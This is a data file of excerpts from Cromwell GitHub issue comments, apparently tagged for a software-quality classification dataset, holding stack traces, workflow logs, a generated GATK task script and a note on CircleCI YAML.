Integrability,rictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResultWith$2(BasicDirectives.scala:72); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.ExecutionDirectives.$anonfun$handleExceptions$2(ExecutionDirectives.scala:32); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.Route$.$anonfun$asyncHandler$1(Route.scala:86); 	at akka.stream.impl.fusing.MapAsyncUnordered$$anon$26.onPush(Ops.scala:1303); 	at akka.stream.impl.fusing.GraphInterpreter.processPush(GraphInterpreter.scala:519); 	at akka.stream.impl.fusing.GraphInterpreter.execute(GraphInterpreter.scala:411); 	at akka.stream.impl.fusing.GraphInterpreterShell.runBatch(ActorGraphInterpreter.s,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:3410,Rout,RouteConcatenation,3410,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,1,['Rout'],['RouteConcatenation']
Integrability,"rk(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$1(HealthMonitorServiceActorSpec.scala:40); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.services.healthmonitor.HealthM",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5988,message,messages,5988,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['message'],['messages']
Integrability,"rkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1056) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.Abstr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:7320,message,message,7320,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['message'],['message']
Integrability,"rror_continue.wdl error_continue.json; [2016-01-31 16:37:25,449] [info] RUN sub-command; [2016-01-31 16:37:25,469] [info] WDL file: error_continue.wdl; [2016-01-31 16:37:25,471] [info] Inputs: error_continue.json; [2016-01-31 16:37:25,989] [info] Slf4jLogger started; [2016-01-31 16:37:26,86] [info] SingleWorkflowRunnerActor: launching workflow; [2016-01-31 16:37:27,345] [info] Running with database db.url = jdbc:hsqldb:mem:748afb13-e3af-4e9d-af14-5c2b3bd209a9;shutdown=false;hsqldb.tx=mvcc; [2016-01-31 16:37:28,247] [info] WorkflowManagerActor submitWorkflow input id = None, effective id = 2a89a995-aa89-4172-a5e1-1054cbccd9e0; [2016-01-31 16:37:28,291] [info] WorkflowManagerActor Found no workflows to restart.; [2016-01-31 16:37:28,660] [info] WorkflowActor [2a89a995]: Start(Some(Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor#-896492658])) message received; [2016-01-31 16:37:28,788] [info] WorkflowActor [2a89a995]: ExecutionStoreCreated(Start(Some(Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor#-896492658]))) message received; [2016-01-31 16:37:28,789] [info] SingleWorkflowRunnerActor: workflow ID 2a89a995-aa89-4172-a5e1-1054cbccd9e0; [2016-01-31 16:37:28,798] [info] WorkflowActor [2a89a995]: Beginning transition from Submitted to Running.; [2016-01-31 16:37:28,800] [warn] SingleWorkflowRunnerActor: received unexpected message: CurrentState(Actor[akka://cromwell-system/user/WorkflowManagerActor/WorkflowActor-2a89a995-aa89-4172-a5e1-1054cbccd9e0#2034772397],Submitted); [2016-01-31 16:37:28,800] [info] WorkflowActor [2a89a995]: transitioning from Submitted to Running.; [2016-01-31 16:37:28,801] [info] SingleWorkflowRunnerActor: transitioning to Running; [2016-01-31 16:37:28,804] [info] WorkflowActor [2a89a995]: starting calls: w.hello; [2016-01-31 16:37:28,805] [info] WorkflowActor [2a89a995]: persisting status of hello to Starting.; [2016-01-31 16:37:28,959] [info] WorkflowActor [2a89a995]: inputs for call 'hello':; addressee -> WdlString(Strin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:1845,message,message,1845,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,2,['message'],['message']
Integrability,rver.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRouteResultWith$2(BasicDirectives.sca,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:2645,Rout,RouteConcatenation,2645,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,2,['Rout'],"['RouteConcatenation', 'RouteWithConcatenation']"
Integrability,"s going... I am not even sure if I need to quit... ```; [2016-10-27 13:47:19,26] [info] JesAsyncBackendJobExecutionActor [fd2fcb78case_gatk_acnv_workflow.HetPulldown:13:1]: JesAsyncBackendJobExecutionActor [fd2fcb78:case_gatk_acnv_workflow.HetPulldown:13:1] Status change from - to Initializing; [2016-10-27 13:47:19,26] [info] JesAsyncBackendJobExecutionActor [fd2fcb78case_gatk_acnv_workflow.HetPulldown:9:1]: JesAsyncBackendJobExecutionActor [fd2fcb78:case_gatk_acnv_workflow.HetPulldown:9:1] Status change from - to Initializing; [2016-10-27 13:47:19,27] [info] JesAsyncBackendJobExecutionActor [fd2fcb78case_gatk_acnv_workflow.HetPulldown:15:1]: JesAsyncBackendJobExecutionActor [fd2fcb78:case_gatk_acnv_workflow.HetPulldown:15:1] Status change from - to Initializing; [2016-10-27 13:47:24,90] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 503 Service Unavailable; {; ""code"" : 503,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Backend Error"",; ""reason"" : ""backendError""; } ],; ""message"" : ""Backend Error""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:3",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256645647:1068,message,message,1068,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256645647,2,['message'],['message']
Integrability,"s: case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1, case_gatk_acnv_workflow.PlotACNVResults:3:1; [2016-10-28 14:38:18,14] [info] JesRun [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1]: JES Run ID is operations/ENPH6N2AKxi-zoCK0M65gEAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:18,31] [info] JesRun [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:3:1]: JES Run ID is operations/EPfI6N2AKxi_iI64ku3M2xAgn5eRl70GKg9wcm9kdWN0aW9uUXVldWU; [2016-10-28 14:38:43,07] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.CNLoHAndSplitsCaller:3:1] Status change from - to Initializing; [2016-10-28 14:38:43,07] [info] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:3:1]: JesAsyncBackendJobExecutionActor [a3dd8163:case_gatk_acnv_workflow.PlotACNVResults:3:1] Status change from - to Initializing; [2016-10-28 14:38:43,07] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:43,07] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:4:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.recei",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:13860,message,message,13860,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['message'],['message']
Integrability,"s://temporary-files/PET508-001/workspace/SingleSampleGenotyping/b67b285a-1f63-4514-b472-8618f1082470/call-ubam2bam/from_ubam.to_bam_workflow/4306b863-7708-4627-babd-47017753d512/call-MakeAnalysisReadyBam/processing.MakeAnalysisReadyBam/ac5adb53-d888-4b9f-b062-48504e1a4853/call-BaseRecalibrator/shard-9/; fi ; RC=$?; if [ \""$RC\"" = \""0\"" ]; then break; fi; sleep 5; done; return \""$RC\""; }; retry"": Copying file: ///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. Copying file:///cromwell_root/stdout [Content-Type=text/plain; charset=UTF-8]... / [0 files][ 0.0 B/ 76.3 KiB] ServiceException: 401 Requester pays bucket access requires authentication. ""; }],; message: ""Workflow failed""; }],; message: ""Workflow failed""; }; ],; ```. This step is executed in a scatter way, 17x per analysis (distinct genomic interval for each shard). Bellow follows the cromwell script of the shard that processed chromosome 12 and 13:. ```bash; #!/bin/bash. cd /cromwell_root; tmpDir=$(mkdir -p ""/cromwell_root/tmp.a7701249"" && echo ""/cromwell_root/tmp.a7701249""); chmod 777 ""$tmpDir""; export _JAVA_OPTIONS=-Djava.io.tmpdir=""$tmpDir""; export TMPDIR=""$tmpDir""; export HOME=""$HOME""; (; cd /cromwell_root. ); oute4a6eeab=""${tmpDir}/out.$$"" erre4a6eeab=""${tmpDir}/err.$$""; mkfifo ""$oute4a6eeab"" ""$erre4a6eeab""; trap 'rm ""$oute4a6eeab"" ""$erre4a6eeab""' EXIT; tee '/cromwell_root/stdout' < ""$oute4a6eeab"" &; tee '/cromwell_root/stderr' < ""$erre4a6eeab"" >&2 &; (; cd /cromwell_root. /usr/gitc/gatk4/gatk-launch --javaOptions ""-XX:GCTimeLimit=50 -XX:GCHeapFreeLimit=10 -XX:+PrintFlagsFinal \; -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintGCDetails \; -Xloggc:gc_log.log -Xms4000m"" \; BaseRecalibrator \; -R",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865:2164,message,message,2164,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336#issuecomment-435847865,2,['message'],['message']
Integrability,shaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93) ~[cromwell.jar:0.19]; at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.status(Run.scala:143) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.checkStatus(Run.scala:156) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:933) ~[cromwel,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8959,protocol,protocol,8959,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['protocol'],['protocol']
Integrability,sl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$1(RouteConcatenation.scala:44); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$mapRequestContext$2(BasicDirectives.scala:43); 	at akka.http.scaladsl.server.directives.BasicDirectives.$anonfun$textract$2(BasicDirectives.scala:159); 	at akka.http.scaladsl.server.RouteConcatenation$RouteWithConcatenation.$anonfun$$tilde$2(RouteConcatenation.scala:47); 	at akka.http.scaladsl.util.FastFuture$.strictTransform$1(FastFuture.scala:41); 	at akka.http.scaladsl.util.FastFuture$.transformWith$extension1(FastFuture.scala:45); 	at akka.http.scaladsl.util.FastFuture$.flatMap$extension(FastFuture.scala:26); 	at akka.http.scala,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187:2338,Rout,RouteConcatenation,2338,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467133187,1,['Rout'],['RouteConcatenation']
Integrability,"src; ```. This syntax says ""find the section defined as defaults (above) and insert it here. ```; <<: *defaults; ```; so you don't write it twice!. This is similar, but it's like a named anchor and pointer. I might have this under a jobs step. ```; - run: *dothething; ```; which might be in reference to this. ```; dothething: &dothething; name: Do the thing; command: |; echo ""Do the thing!""; echo ""Do it again!""; ```. - The main runtime in the file is the workflow jobs section, which just does a build and deploy.; - the base container that is run is one of circle's ready to docker docker images `docker:18.01.0-ce-git`; - The main steps are to load cache, install dependencies, build the container, run to test, and then save the cache and deploy. That's really it :); - you interact with the environment by writing it to `BASH_ENV` and sourcing that, which needs to be done in each step separately (e.g., a ""run"" section); - most of the weird if statement logic is just to test if the user (you) has defined an environment variable (somewhere) and if not, go to default or just skip a step.; - the easiest way to ""read"" the file is to go to the bottom and start at ""workflows"" that describe the highest level of things, e.g. ""run all these steps under build, and trigger based on these filters and branches."" TLDR **workflows** define a dependency graph sort of deal.; - The details for the steps for each workflow are under ""jobs"" that are the seconds above that, so the names of jobs are going to correspond to workflows. In ""jobs"" you can then trace back up to find the corresponding step. TLDR **jobs** are all the steps of stuff to do.; - Steps that aren't found (e.g., checkout) are circle provided steps that you can read about in their docs --> https://circleci.com/docs/2.0/configuration-reference/. And importantly, in the beginning it all just looks weird. You will come back to the same file and be a little confused. This yaml business is weird, but I promise it clicks over time!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635:2711,depend,dependency,2711,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-415952635,1,['depend'],['dependency']
Integrability,"stderr"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2-stderr.log"",; ""attempt"": 1,; ""executionEvents"": [],; ""backendLogs"": {; ""log"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2.log""; },; ""start"": ""2016-04-24T15:50:19.000Z""; }. ```. Log stack trace: . ```; 3589853:2016-04-24 20:04:45,142 cromwell-system-akka.actor.default-dispatcher-16 INFO - JES Run [UUID(129f0510):CollectQualityYieldMetrics:2]: Status change from Running to Failed; 3589854:2016-04-24 20:04:45,145 cromwell-system-akka.actor.default-dispatcher-16 ERROR - CallActor [UUID(129f0510):CollectQualityYieldMetrics:2]: Failing call: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589855:java.lang.Throwable: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589856- at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$handleFailure(JesBackend.scala:774) ~[cromwell.jar:0.19]; 3589857- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:685) ~[cromwell.jar:0.19]; 3589858- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:659) ~[cromwell.jar:0.19]; 3589859- at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:2354,Message,Message,2354,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['Message'],['Message']
Integrability,synchronize,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7338#issuecomment-1847803816:0,synchroniz,synchronize,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7338#issuecomment-1847803816,1,['synchroniz'],['synchronize']
Integrability,"t$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:11,89] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:11,89] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:7:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at 